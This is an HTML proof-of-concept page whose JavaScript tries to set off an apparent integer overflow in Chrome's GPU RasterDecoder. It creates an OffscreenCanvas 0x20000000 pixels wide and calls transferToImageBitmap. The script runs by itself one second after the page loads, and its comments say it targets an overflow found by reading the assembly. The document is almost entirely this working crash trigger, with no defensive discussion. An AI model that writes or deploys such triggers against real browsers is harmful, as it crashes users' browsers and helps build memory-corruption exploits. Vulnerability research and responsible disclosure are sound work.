<!DOCTYPE html>
<html>
<body>
    <script>
        async function triggerCrash() {
            try {
                // 0x20000000 width * 4 bytes = 0x80000000 bytes (2GB)
                // This targets the exact overflow we found in the assembly.
                const width = 0x20000000;
                const height = 1;
                
                console.log("[*] Initializing OffscreenCanvas with width:", width.toString(16));
                
                const canvas = new OffscreenCanvas(width, height);
                const ctx = canvas.getContext('2d');
                
                // This triggers the RasterDecoder via the GPU Command Buffer
                const bitmap = canvas.transferToImageBitmap();
                
                console.log("[!] Trigger sent. Check chrome://crashes");
            } catch (e) {
                console.error("[-] Caught: " + e.message);
            }
        }
        
        setTimeout(triggerCrash, 1000);
    </script>
</body>
</html>
